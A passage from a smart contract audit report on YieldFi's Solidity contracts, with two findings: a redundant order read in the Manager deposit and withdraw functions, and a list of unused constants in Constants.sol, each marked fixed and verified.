    _withdraw(msg.sender, _receiptId, _amount, _fee, _gas);
}
```
Then order is read again in both [`Manager::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L252-L253):
```solidity
function _deposit(address _caller, uint256 _receiptId, uint256 _shares, uint256 _fee, uint256 _gasFeeShares) internal {
    Order memory order = IReceipt(receipt).readOrder(_receiptId);
```

and [`Manager::_withdraw`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L327-L328):
```solidity
function _withdraw(address _caller, uint256 _receiptId, uint256 _assetAmountOut, uint256 _fee, uint256 _gasFeeShares) internal {
    Order memory order = IReceipt(receipt).readOrder(_receiptId);
```

This extra read is unnecessary. Consider passing the `Order memory order` as a parameter to `Manager::_deposit` and `Manager::_withdraw` instead. Thus saving to read the data again from the receipt:
```solidity
function _deposit(..., Order memory order) internal {

function _withdraw(..., Order memory order) internal {
```

**YieldFi:** Fixed in commit [`823b010`](https://github.com/YieldFiLabs/contracts/commit/823b010d74fd55fb88b31619c1a94dac2ef65ad3)

**Cyfrin:** Verified.

\clearpage

## [M-48] Unused constants
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** In `Constants.sol` there are a some unused constants, consider removing thses:
* [#L21: `SIGNER_ROLE`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L21)
* [#L38: `VESTING_PERIOD`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L38)
* [#L41 `MAX_COOLDOWN_PERIOD`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L41)
* [#L44: `MIN_COOLDOWN_PERIOD`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L44)
* [#L47 `ETH_SIGNED_MESSAGE_PREFIX`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L47)
* [#L50`REWARD_HASH`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L50)
* [#L56-L59 `DEPOSIT`, `WITHDRAW`, `DEPOSIT_L2`, `WITHDRAW_L2`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L56-L59)

**YieldFi:** Fixed in commit [`125ec4a`](https://github.com/YieldFiLabs/contracts/commit/125ec4a944c436e587d7380b8c4bf6232d3264aa)

**Cyfrin:** Verified.

<!-- /Cyfrin Fixed Issues (Merged) -->
